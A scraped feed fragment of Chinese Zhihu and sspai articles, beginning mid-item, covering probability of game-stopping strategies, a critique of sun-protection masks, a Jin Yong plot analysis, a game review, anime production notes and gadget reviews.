src=\"https://www.zhihu.com/equation?tex=r_X%3D%5Cfrac%7B%5Csum_%7Bi%3D1%7D%5En%28X_i-1%29%7D%7B%5Csum_%7Bi%3D1%7D%5EnX_i%7D%3D%5Cfrac%7B%5Csum_%7Bi%3D1%7D%5EnX_i-n%7D%7B%5Csum_%7Bi%3D1%7D%5EnX_i%7D%3D1-%5Cfrac%7Bn%7D%7B%5Csum_%7Bi%3D1%7D%5EnX_i%7D%5C%5C+%3D1-%5Cfrac%7B1%7D%7B%5Cfrac%7B1%7D%7Bn%7D%5Csum_%7Bi%3D1%7D%5EnX_i%7D%5Capprox+1-%5Cfrac%7B1%7D%7B%5Ctext%7BE%7DX%7D%3D1-%5Cfrac%7B1%7D%7B1%2Fq%7D%3Dp\" alt=\"\"></p>\n<p>其中我们用到了大数定律，大量样本的平均值趋向于期望</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Cfrac%7B1%7D%7Bn%7D%5Csum_%7Bi%3D1%7D%5EnX_i%5Capprox+%5Ctext%7BE%7DX\" alt=\"\"></p>\n<p>如果采取\"赢了就睡觉\"策略反复玩游戏</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=n\" alt=\"\"></p>\n<p>天，每天一共玩</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=Y_i%28i%3D1%2C2%2C%5Ccdots%2Cn%29\" alt=\"\"></p>\n<p>局，赢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=1\" alt=\"\"></p>\n<p>局，那么总共赢了</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Csum_%7Bi%3D1%7D%5En+1%3Dn\" alt=\"\"></p>\n<p>局，赢率为：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r_Y%3D%5Cfrac%7Bn%7D%7B%5Csum_%7Bi%3D1%7D%5EnY_i%7D%3D%5Cfrac%7B1%7D%7B%5Cfrac%7B1%7D%7Bn%7D%5Csum_%7Bi%3D1%7D%5EnY_i%7D%5Capprox+%5Cfrac%7B1%7D%7B%5Cfrac%7B1%7D%7Bp%7D%7D%3Dp\" alt=\"\"></p>\n<p>因此如果每天采取同样的策略玩游戏，长此以往，<strong>两种策略的赢率是一样的</strong>，都是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p\" alt=\"\"></p>\n<p>。这类似于如果所有人都采用一直生娃，直到生出男(女)娃停止的生育策略，那么男女比率还是 1:1。</p>\n<p><strong>问题 3：如何稳赢？</strong></p>\n<p>现在小明有了三种游戏策略：a.只玩一把就睡觉，b.输一把就睡觉，c.赢一把就睡觉，上面我们推导出这三种策略的胜率都是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p\" alt=\"\"></p>\n<p>。但是在现实生活中，这三种策略的实际胜率具有随机性，其波动大小并不一样。这就好比你有三种股票可以选择投资，它们的平均回报率可能都是 5%，但其波动性不同：第一种股票稳赚 5%，第二种股票可能赚 1%-%9，第三种股票可能赚 15%，也可能亏 5%，只是平均而言赚 5%。小明的人生只有一次，因此当他选择投资方式时，应该选择波动性较小或者风险较低的投资方式，甚至为较小的风险、牺牲一定回报率也是值得的。这也是为什么国债虽然利率低，但总是很抢手，因为风险极低。</p>\n<p>我们可以用胜率的标准差来衡量其波动性，假设小明是高玩(</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3D0.9\" alt=\"\"></p>\n<p>)，下图种展示了小明采取三种策略的胜率的均值和标准差，可以看到随着游戏天数增加，三种策略的平均胜率很快趋向于 0.9，但\"输一把就睡\"的 error bar 更窄，说明<strong>胜得更稳</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4d4460075dc06a706c8f4d7b8efb7c81_720w.jpg?source=8673f162\" alt=\"\"></figure><p>相反，下图表明如果小明是菜鸡(</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3D0.1\" alt=\"\"></p>\n<p>)，采取赢一把就睡的策略，不仅能够爽玩，赢率也更稳定。如果小明的目标是提高胜率，那么采取输一把就睡策略，胜率的波动性更大，更有可能高到 0.15 以上，但也有较大可能低到 0.05 以下，如果小明兼有赌狗属性，也许会<strong>不理智地</strong>选择这种<strong>高风险策略</strong>。对于理性人来说，当平均收益(胜率)相同时，总是应该选择低风险的策略。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-2055b33880f3c97c98f755913eeea8bd_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>总结：</strong></p>\n<p>两种策略的赢率是一样的，对于高玩(</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3E0.5\" alt=\"\"></p>\n<p>)采取赢了就睡觉策略能更快睡上觉，但赢率波动性较大，反之对于菜鸡(</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3C0.5\" alt=\"\"></p>\n<p>)，采用赢了就睡觉策略更难睡上觉。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/461910176\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737644"},{"title":"防晒口罩和普通口罩的区别在哪？是智商税吗？","date":"2021-07-01 23:06:43","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-fb32fc943a6c867ea8c765c646a56b8f_l.jpg?source=8673f162\"><span>姚蔚铭，</span><span>纺织品化学工程师（神秘职业） 纺织品问题请付费咨询</span>\n<a href=\"https://www.zhihu.com/question/369210379/answer/1966467088\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>先说结论：</strong>防晒口罩就是智商税，并且<strong>还要额外收点生命税</strong></p>\n<p>如果你想弄明白<strong>防晒口罩</strong>，<strong>那你一定要找我</strong>，因为只有我（姚蔚铭 <strong>纺织品化学工程师</strong>）才能给你讲明白。</p>\n<p>凡是大肆<strong>假科普真带货</strong>的文章，都会只和你提防晒口罩的防晒效果（UPF 值）,如果你知道防晒口罩是如何生产制造出防晒效果的，那你可能再也不愿意用了。</p>\n<blockquote>插一句，<strong>防晒伞也是智商税</strong>“<a href=\"https://www.zhihu.com/question/268862323/answer/1963048963\">遮阳伞有必要买很贵的吗？</a>”<strong>但防晒衣不是智商税</strong>“<a href=\"https://www.zhihu.com/question/398086368/answer/1956472996\">防晒衣是不是智商税？</a>”，它们的防晒出发点并不一样。</blockquote>\n<hr>\n<p><strong>1.盲目追求 UPF 数值 毫无意义！</strong></p>\n<p>正常的防晒功能根本不需要去实现，普通的<strong>几毛钱的一次性口罩就有足够的防晒效果了</strong>。如果没有，那他们的脸是如何晒成这样的？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-9f617b6b97e5bf810ab844c64e1b8f60_720w.jpg?source=8673f162\" alt=\"\"></figure><p>许多商家都在标榜自己的产品高 UPF 值，但根本不给你解释清楚什么是 UPF 值。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5303211a178bc5921e66a353404d9e86_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实这串八股文换成人话讲就是</p>\n<blockquote>\n<strong>50 UPF=</strong>只有<strong>50 分之 1</strong>的紫外线可以通过<br><strong>30 UPF=</strong>只有<strong>30 分之 1</strong>的紫外线可以通过<br>..........以此类推</blockquote>\n<p>假科普真带货的文章，只会一味告诉你购买 高 UPF 值 的防晒口罩，其实<strong>高 UPF 值毫无意义</strong>。</p>\n<p><strong>哪怕 UPF 只有可怜的 15</strong>（普通口罩水平）<strong>，也能阻挡 93.3%的紫外线。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-9392ab74f097206934bdf4c0884b6c66_720w.jpg?source=8673f162\" alt=\"\"><figcaption>因为我真的有设备直接测试（普通医用口罩）</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-8ca48da82cee29c0e6e15415c94c924c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>看似防晒口罩 UPF 50 和 30 差距很大，其实 UPF 50 换算过来就是紫外线穿透 2.0%，UPF 30 等于紫外线穿透 3.3%。</p>\n<p>差距根本不大，良心的讲，<strong>盲目追求 UPF 数值毫无意义</strong>。</p>\n<blockquote>UPF 值详细分析参考这篇<a href=\"https://www.zhihu.com/question/398086368/answer/1956472996?utm_source=zhihu&amp;utm_medium=social&amp;utm_oi=613892982542438400\">防晒衣是不是智商税？</a>\n</blockquote>\n<p><strong>2.高防晒值的口罩是如何制作的？</strong></p>\n<p>前面讲了，普通的口罩足以提供良好的防晒效果（日常出勤完全完全完全足够），但是<strong>“通过防晒产品的认证”</strong>要求是很严格的。</p>\n<p>要达到 <strong>UVA 透射率小于 5%，UPF 值大于 40</strong></p>\n<p>因为中国防晒产品的标准基于最严格的欧州标准，像澳洲、新西兰、美国的抗紫外标准都是以 UPF 15 就足够了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0c91f42331e1c7827fa28be60db86869_720w.jpg?source=8673f162\" alt=\"\"></figure><p>为了通过这么严格的防紫外产品认证，单靠面料本身已经远远不够。</p>\n<p>所以就要<strong>在口罩上加料</strong></p>\n<p>加的就是<strong>三嗪类的紫外吸收剂</strong>，依靠分子结构中<strong>酮式</strong>与<strong>烯醇式</strong>的转换 ,把吸收的光能转换成热能</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-f647684ef96623fde8c7b5c363e75fb7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>又是学术定义式的八股文，就不深入讲了，总之一句话，<strong>只有这东西加的多了</strong>，防护紫外线的能力才能好，UPF 值才能达到 40 以上。</p>\n<p>不过大家好不好奇，<strong>三嗪类的化学物质到底是啥？</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cb6533ba6ab502aefa9288ce3c37924e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实三嗪这个东西一听上去很陌生，那我提一下它的兄弟，就是加在三鹿奶粉里大名鼎鼎（臭名远扬）的<strong>三聚氰胺</strong>大家是不是就不陌生了。</p>\n<p>这种三嗪类的抗紫外剂<strong>加在衣服上是没有事情的，放心。</strong>因为它不会渗入皮肤也不会刺激皮肤。</p>\n<p>但是口罩就不一样了，经常和嘴唇接触并且潮湿，还有唾液的影响。上面的抗紫外剂在这种情况下是不牢固的，<strong>吃进去多少就看你嘴唇干不干了</strong>。</p>\n<p>要不是三鹿倒闭了，现在三鹿出防晒系列一定热卖。广告语就叫：“三鹿牌防晒口罩，纵享牛奶般的丝滑”</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-474b2470cfbf70d58b64356b700b6606_720w.jpg?source=8673f162\" alt=\"\"></figure><p>所以在纺织品基本安全规范标准中，针对婴幼儿纺织品（A 类纺织品）会添加<strong>耐唾液色牢度</strong>这个检测项目</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9a6b9e198e53bf66dac3e228280397bc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>因为婴儿的嘴部会经常接触面料，有潜在健康危害。所以如果你买防晒口罩，尽量买安全技术类别为 A 类的防晒口罩和 73049-2014 《针织口罩》标准认证。</p>\n<p>劝大家买各种纺织品前，先学会看吊牌。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/368895160\">买衣服 | 如何看懂衣服吊牌</a></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7c44fe4c3180b0469c6169a77ad25981_720w.jpg?source=8673f162\" alt=\"\"><figcaption>没有防晒口罩专门的生产标准</figcaption></figure><p>因为没有防晒口罩专门生产标准，所以即便要购买，<strong>也要挑有上述标准认证的</strong>（GB/T 32610-2016 或者<strong>FZ/T 73049-2014</strong>）；<strong>GB/T 18830-2009</strong>《纺织品防紫外线性能的评定》这个标准是检测防紫外性能标准，普通消费者看他根本没用。</p>\n<p>所以我作为<strong>面料供应商的上游</strong>（纺织品化学工程师），我会选防晒口罩吗？</p>\n<p><strong>根本就不会买，一次性口罩足以。</strong>（开始断人财路了，求保护）</p>\n<p><strong>不过还有一种不加抗紫外剂的</strong>，这种一般都是在<strong>涤纶纺丝过程中加入二氧化钛的消光丝</strong>，其中的二氧化钛可以很好的反射紫外线。所以这种防晒效果不错，也更安全，只是略差于抗紫外剂。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-68bd6cd1a89563a14526b057aba16832_720w.jpg?source=8673f162\" alt=\"\"><figcaption>这个光学纤维什么鬼？？？</figcaption></figure><p>如果硬要买防晒口罩，挑这种原纱防晒的。优点是安全，缺点就是闷热。</p>\n<p>为了避免闷热，就<strong>又要引入冰感口罩概念</strong>。</p>\n<p><strong>3.冰感口罩是什么？</strong></p>\n<p>其实冰感口罩实现的方法有很多，普遍采用的是两种方式，一种是在<strong>纺丝过程中添加云母片</strong>，提高导热系数；另一种是<strong>加大量的硅油</strong>，提升导热系数从而带来冰感。</p>\n<p>其实普遍采用加大量硅油的形式，这种不仅凉感明显，而且<strong>手感巨软滑</strong>，消费之一戴都以为是很好的面料做的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8e014be27a96eb42bba3d3917ae6e6b3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不过好在硅油的直接毒性是小于抗紫外剂的，一般都是一些 D4、D5、D6 环体之类的残留，对人的影响应该、或许、可能、大约、不算太大。</p>\n<p>慢性过程，发现也是十几年后的事情了</p>\n<p>有的冰感口罩会在宣传页列出 Q-MAX 值检测报告，其实毛用没有，这个检测标准其实就有点问题，经常发现 Q-MAX 数值很漂亮，但冰感并不明显。<strong>加硅油才是王道</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ac7a341d3910bf40959d5db63c45cd94_720w.jpg?source=8673f162\" alt=\"\"><figcaption>就是这种粘稠的油液体</figcaption></figure><p><strong>4.吸湿速干怎么做的？</strong></p>\n<p>有的防晒口罩不是会加这种吸湿速干的宣传页么，<strong>它是如何实现的？</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b6fb839a22aa101d3bb7ba2f278d81fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个其实有两种实现方式，不过一般是两种结合在一起用</p>\n<p>一种是纤维纺丝时采用<strong>异形纺丝</strong>的方式，汗液沿着纤维沟槽流动。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-04174c10cb0b435b8b1580468a761384_720w.jpg?source=8673f162\" alt=\"\"></figure><p>另一种就是加<strong>聚酯聚醚类化学物质</strong>的吸湿排汗剂，明显提高面料吸湿性能</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-efe96c5efb5563a34729ffc4d729529e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>5.防晒口罩推荐（因为良心在，所以根本不推荐）</strong></p>\n<p>我就先不说防晒口罩<strong>不能过滤 pm2.5 更不能防新冠</strong>，这么多化学物质接触皮肤和接触嘴是完全不同的结果，如果真的想大面积阻挡脖子、颈部防晒，撑把伞足够了。</p>\n<p>防晒口罩对于日常通勤的人士毫无意义，所以根本不推荐。</p>\n<p>因为许多品牌这两年，一直<strong>利用消费者对纺织品防晒知识的不了解</strong>，发现了防晒系列产品的暴利，<strong>大肆渲染紫外线的危害和恐惧</strong>。</p>\n<blockquote>卖钙片的说：隔着玻璃晒太阳没用，因为玻璃会吸收 30%紫外线，影响钙吸收。<br>卖防晒产品的说：UPF 小于 40 的没用（阻挡了 96%紫外线）依然会被晒黑</blockquote>\n<p>一次性口罩生产要求又高，安全有保证，既防 PM2.5 又防新冠，并且防晒效果又足够。几毛钱一个，我是不会买防晒口罩（断人财路，求保护。。。）</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/104608841\">医用口罩是如何阻挡看不见的病毒的？</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/369210379\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737635"},{"title":"周芷若在荒岛上为什么不杀赵敏？","date":"2021-07-01 23:06:37","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-03d18a8dfec55f50158eec7dd2508a25_l.jpg?source=8673f162\"><span>宜柔，</span><span>有的人之所以宝贵，是因为他们像风，永不停歇，谁也留不住。</span>\n<a href=\"https://www.zhihu.com/question/457353518/answer/1944222028\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这种说法不对。周芷若不仅打算杀了赵敏，而且实施了杀人行为。你想想，把一个中了十香软筋散之毒且处于昏迷状态的人扔进海里，这种行为本身就包含了致人死亡的高度盖然性。只不过赵敏运气太好了没有死，这不叫不杀赵敏，而是“欲达目的而不能”，周芷若构成故意杀人罪（未遂）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-1e5444cb91ac59a64d40149a0fb1073c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>祝绪丹版周芷若</figcaption></figure><p>至于为何不嫁祸谢逊，那是因为：第一，周芷若当时并不知道金毛狮王偶尔会发狂；第二，周芷若给所有人都下了十香软筋散，狮王本人也中了毒；第三，周芷若本人还出于嫉妒和嫁祸于人的目的，把蛛儿的脸划伤了，从这点来看，赵敏嫌疑最大，因为曾经赵敏在万安寺也是预备毁周芷若容的。而谢逊如果发了疯，何至于毁了蛛儿容貌，这点在逻辑上难以自洽。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d0e96557f9e5ea07ce039030059b4973_720w.jpg?source=8673f162\" alt=\"\"><figcaption>高圆圆版周芷若</figcaption></figure><p>所以我想，你想问的是“为何周芷若没有手刃赵敏或者把她捂死、掐死，而是要让她被海水淹死”。这是因为周芷若什么都想要：一来她要报杀师之仇，赵敏对灭绝师太的死确实是有很大的责任；二来她想要婚姻，杀了正妻蛛儿后一定要有个嫁祸的对象；三来她想要张无忌的爱情，那么赵敏一定要带着满身污点去死。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d274e0f9c83c9b0c36513e912c11dfc1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>张敏版赵敏，搭档是黎姿，黎姿目前是唯一个既演过周芷若又演过赵敏的演员，但这个版本的周芷若其实是周芷若 + 朱九真。</figcaption></figure><p>四来倚天屠龙的秘密只有她知道，而赵敏持有倚天剑，又是朝廷的人，自然应该嫁祸赵敏；五来当时岛上只有他们 5 个人，谢逊和张无忌情同父子，正房蛛儿又病入膏肓，那么最适合嫁祸的那当然是赵敏了，而且赵敏本人太聪明了，只要赵敏没死，那么她一定会输。概言之，在周芷若的计划里，赵敏必须是背锅侠，也必死无疑，还要死得其法。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a0034e2d0b171b2602130d160fa55704_720w.jpg?source=8673f162\" alt=\"\"><figcaption>陈钰琪版赵敏</figcaption></figure><p>那么为何不能把赵敏掐死、闷死，或者砍死呢？那是因为若趁赵敏昏迷掐死或者闷死她，然后扔进海里喂鱼，貌似是安全了。可如果一旦海浪把赵敏尸体带回来，张无忌很容易就会发现赵敏在落水之前就死了，因为如果是淹死的，肺里面不可能没有水，肺里没水就说明赵敏一定是被弄死了再扔海里的。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-0002cb110de413b3d576dabaf4adff24_720w.jpg?source=8673f162\" alt=\"\"><figcaption>贾静雯版赵敏</figcaption></figure><p>砍死赵敏后再扔水里也同理。问题关键在于周芷若要让张无忌恨赵敏，那她就要“制造”出一个无比阴毒的赵敏，让众人觉得是赵敏意图下毒夺刀杀人。如果赵敏尸体被海浪冲回来，她倒是可以推说赵敏是因为遇到波斯船队被砍杀而死。但只要找到波斯人对峙，谎言就会被戳穿，同时因为她想要张无忌的爱情，她需要维持一种楚楚动人、无依无靠的人设，所以她不能冒这个险。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-cab387b33228430f2d4dd2cff1fabc0b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>黎姿版赵敏</figcaption></figure><p>所以，对于当时啥都想要的周芷若来说，最万无一失的万全之策就是直接让吃了十香软筋散的赵敏沉入大海。那时候，由于死人不会说话，即使赵敏的尸体被海浪冲上了岸，所有人也都只会觉得赵敏是“自作孽不可活”，那时候周芷若想要的婚姻、爱情、掌门人、教主夫人，还有武功艳压群雄、找到完美替死鬼、为师父报仇等目标都可以实现了。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-d783895f2d58c70568de766929845e37_720w.jpg?source=8673f162\" alt=\"\"><figcaption>佘诗曼版周芷若</figcaption></figure><p>当然后来周芷若千算万算也没想到：孤岛上忙活了一通下来，蛛儿没死、赵敏被救起，谢逊也知道了孤岛事件的真相，自己机关算尽、寻死觅活、一哭二闹三上吊谋来的姻缘，就这么成了笑话。也可以说是人算不如天算，苍天有眼了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d00964b359e2a18b325d64db42d1326c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>叶童版赵敏和周海媚版周芷若</figcaption></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/457353518\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737666"},{"title":"如何评价《明日方舟》新六星卡涅利安？","date":"2021-07-01 15:30:08","description":"\n<p>粗略地做了个卡涅利安的评测视频。她的定位是环法，常态高防，不开技能可以用作嘲讽吸引伤害，开技能时也有极高的DPS，清场秒人两不误。而且谁能拒绝埃及风小姐姐呢（</p>\n<hr>\n<p>第二个评测视频出来了，6人H7-4卡姐伤害测试，有兴趣可以移步观看</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/virunce?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Yuro</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/461539120/answer/1920212609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">67 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/469574147?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">明日方舟的设定是不是有什么问题?</a><br><a href=\"http://www.zhihu.com/question/467680402?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">明日方舟新人求指点？</a><br>\n","link":"http://www.zhihu.com/question/461539120/answer/1920212609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《画江湖之不良人》第四季第十二集？","date":"2021-07-01 11:30:07","description":"\n<p>终于快迎来结局了，其实最后一集片子的音效我现在还没完全通过，今天少说点，得赶紧去工作啦。下周最后一更多写，写一堆。</p>\n<p><br></p>\n<p>先感谢赵梦娇小姐姐<i>（蚩梦/鲜参 CV）</i>。</p>\n<p><br></p>\n<p>《花腰带》这首歌早先其实并没有安排两个版本，她唱的版本是后来加的。原因是这首歌成品出来后，我总觉的鲜参年轻的时候一开口是原生态腔有点儿奇怪，因此才有的《花腰带》CV版。</p>\n<p><br></p>\n<p><b>这首歌是没有报酬的，咱娇姐送的！</b>当然饭是管的，我记得录完歌请她吃了顿火锅……</p>\n<p>发布的歌曲中是没有最后一段弦乐的，是因当时做片子时我觉得空所以后加的。</p>\n<a href=\"https://www.zhihu.com/zvideo/1393924776298246144\">12集草配</a><p><i>（很早以前拍摄的，请忽略我给鲜参草配的台词。制作镜头时没有最后的这段弦乐，我只能一边剪辑一边嘴配，贼逗。最后出片子前再交给毛亮老师按我嘴配的加了这部分。其实有时候剪烦躁了，连音效我都嘴配……叮咣咚唰的。这里顺便给自己邀个功，不良人4是我配音的处女作，哈哈哈！基本上旧部打斗那些喊叫奸笑都是我跟镜头导演任伟杰配的，第五季的导演也被我拉过来配过群杂角色——不过群杂里的男一，绝对是我！）</i></p>\n<p>本集略有些伤感，李偘、李星云他们也做了该做的事——正所谓，我不入地狱，谁入地狱。蚩离、鲜参也完成了他们这一辈人该做的事，弥补了当年犯下的错误。本季最终结局下周就要来了，我这里关于剧情也不多讲了，每个人看剧时都会有不同的感受，其实就我个人而言我倒是没有觉得很虐，但杨磊大大就觉得虐，还发了微博强调这个事。。。。。总之，喜欢看的小伙伴们就请继续看吧。</p>\n<p>下周主要说一下蚩梦的情感线，以及这个人物的由来等，包括尤川的问题，会一并聊。</p>\n<p>最后，百年荣光，普天同庆。</p>\n<p>但任重而道远，吾辈当自强，祝祖国繁荣昌盛 ！ </p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/467933480/answer/1972409154?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">131 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/464286335?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第10集？</a><br><a href=\"http://www.zhihu.com/question/462893407?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季第9集？</a><br>\n","link":"http://www.zhihu.com/question/467933480/answer/1972409154?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新玩意 069｜少数派的编辑们最近买了啥？","date":"2021-07-01 09:28:48","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@广陵止息: WHOOSH! Screen Shine Pro</h2>\n<ul>\n<li>入手渠道：朋友代购</li>\n<li>价格：120 元</li>\n</ul>\n<p>「如何正确清理屏幕」这个问题从很早以前开始就一直困惑着我。一方面是屏幕涂层不能乱擦，还记得以前不懂事的时候直接把 RMBP 的屏幕涂层给擦花了的情况，所以后来屏幕清洁时基本就对照了 Apple <a href=\"https://support.apple.com/zh-cn/guide/mac-help/mchlp2657/mac\">官方建议</a> 了；另一方面，就是每次用清水和无纺布擦完以后，总感觉屏幕擦得并不够干净，实际上是擦干净了只是不够亮而已。</p>\n<p>直到某次我某次很晚路过 Apple Store，发现里面的店员用一种没见过的带有橙色喷嘴的喷雾喷到布上，然后去擦沾满指纹的 iPad 屏幕，瞬间那个 iPad 的屏幕变得又干净又亮，这个清洁效果让我惊为天人。疯狂私聊对 Apple 有深入了解的死党，了解到 Apple 御用的清洁剂有三种，分别是 iKlear、Clens 以及 WHOOSH!，其中我见到的应该是 WHOOSH!。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/78cb7943ee754cc1e68a15e493e07cd2\"><figcaption>图源：WHOOSH! 官网</figcaption></figure><p>自从了解到这个品牌以后就一直心心念念想要买一瓶，奈何国内真的是没有代理，外加疫情影响严重香港可以代购的朋友也一直没机会回来。好不容易等到他回来都已经到了今年 6 月份了，加上隔离和快递最后终于到我手里了。WHOOSH! Screen Shine Pro 内不仅有一整瓶的清洁喷液，还附赠了两块超细纤维擦拭布，其中一块是将清洁液喷在上面以后再擦拭屏幕的（切记不可以直接将清洁液直接喷到屏幕上，可能会流入显示器内部），另一块则是用于擦干屏幕上残留的清洁剂并抛光的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/9ba4b0ced3cb5d2440edec3b55f4030d.png\"><figcaption>对比图，左：清洁前，右：清洁后</figcaption></figure><p>WHOOSH! 清洁效果也确实好，可以对比上图 iPad 擦前和擦过后的效果。这种清洁液没有任何气味，挥发速度也不算快，所以有充分的机会可以把屏幕上的各种痕迹给擦干净，还可以快速方便地把屏幕<strong>抛光</strong>，仿佛刚刚到手一般。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/6ce514326ca2ee197f28a5fedbfe12a5\"><figcaption>图源：WHOOSH! 官网</figcaption></figure><p>另外就是 WHOOSH! 不仅可以用于擦各种不同尺寸大小的屏幕，还可以用来擦各种设备的外壳甚至是眼镜和镜头这样的东西，也算是一站式的解决方案了。最后，后排提醒：使用任何清洁剂擦拭屏幕之前一定要保证屏幕已经冷却到了室温，否则可能在屏幕上永久残留清洁液的痕迹。</p>\n<h2>@北鸮：全胜 G-4 麦克风隔音屏</h2>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>价格：折后 322 元</li>\n</ul>\n<p>我目前住着的房子基本算是……半成品，没进什么家具，也没搬太多的东西，差不多就是刚刚好保证起居。单说住的话倒是没什么问题（如果不考虑最近修电路的破事儿），就是家具太少，导致屋子的回音非常重，是那种能把我混成 Enya 的程度。我有一个 USB 麦克风，平常就往桌上一架那么用。飞书做了降噪，开会的时候问题不是很大，倒是和我一起开黑打游戏的朋友基本都要把我拉黑了。用他们的话说，我差不多是在阶梯教室里朝坐在最后一排的他们喊集火，有一种大学上课睡着被教授用粉笔射击的恐惧。</p>\n<p>真正给我带来困扰的有两件事：一是我下班之后偶尔自嗨唱唱歌，录出来的声音一片糊；二是前几天我给 <a href=\"https://sspai.com/post/67175\">这篇文章</a> 的视频配了音，挨石听完就跟我说，我屋子的房混太重了，最好的那一版都很糊。我怎么试都调整不出干净的声音，最后只能拯救了一版上去用，实际效果……<a 